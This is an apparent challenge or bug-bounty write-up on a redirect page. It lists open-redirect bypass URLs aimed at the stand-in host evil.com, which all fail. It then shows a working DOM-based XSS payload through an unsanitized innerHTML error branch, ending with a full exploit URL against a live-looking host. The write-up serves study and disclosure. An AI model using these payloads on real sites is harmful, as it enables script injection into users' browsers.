## Open Redirect & DOM-based XSS

### 

### 1. description of the bug

The page takes a `redirect_uri` parameter, checks if it points to a trusted host, and redirects the user there. Two issues were found: an open redirect and a DOM-based XSS hiding in the "blocked" error path.

### 2. Finding the redirect param

Looking at the page's source, the vulnerable parameter was identified:

```js
const redirect_uri = new URLSearchParams(location.search).get("redirect_uri");
```

### 3. The trusted value was only `23.me`

```js
const TRUSTED_HOST = "23.me";
function isTrustedHost(url) {
  try { return new URL(url).host === TRUSTED_HOST; } catch (e) { return false; }
}
```

Only `23.me` passes the check — anything else is rejected.

### 4. Attempts to bypass it

```
https://23.me@evil.com                  
https://evil.com\@23.me                
https://23.me.evil.com                  
https://23.me:443@evil.com              
https://23.me%2eevil.com           
https://23.me.                          
file://23.me/x                          
https:23.me                           
https:/23.me                           
https://23.me-04b2f43d92.<random>.tld   
javascript:alert(1)                                       
```

### 5. Realized the code wasn't going to be bypassed this way

Since `isTrustedHost()` uses the strict `===` comparison on `new URL(url).host`, and the same URL parser is used for both validation and the actual navigation, there's no way to make the check pass while navigating somewhere else. Every userinfo, backslash, subdomain, encoding, and unicode trick failed. This path was a dead end.

### 6. Found the actual bug

A bug was found in the error-display code:

```js
} else if (!isTrustedHost(redirect_uri)) {
  const host = (redirect_uri.split("/")[2] || redirect_uri).slice(0, 60);
  show("blocked", ..., host, ...);
}
...
slip.innerHTML = '...<b>' + pill + '</b>...';
```

When `redirect_uri` contains `<` or `>`, `new URL()` throws, which routes into this "blocked" branch — the one branch that does NOT use the safe `URL` API, and instead splits the raw string and injects it directly into `innerHTML`.

### 7. Exploited the bug

```
?redirect_uri=https://<img src=x onerror=alert(document.domain)>/
```

- `new URL()` throws on the `<`/`>` characters → `isTrustedHost()` returns `false` → blocked branch runs
- `redirect_uri.split("/")[2]` grabs `<img src=x onerror=alert(document.domain)>` as raw text
- This raw HTML is injected via `innerHTML` with no sanitization
- The browser creates a real `<img>` element, the `src=x` fails to load, and `onerror` fires

**Result: `alert(document.domain)` executed successfully.**





# LATEST URL :

```url
https://04b2f43d92.0o8.ir/?redirect_uri=https://%3Cimg%20src=x%20onerror=alert(document.domain)%3E/
```
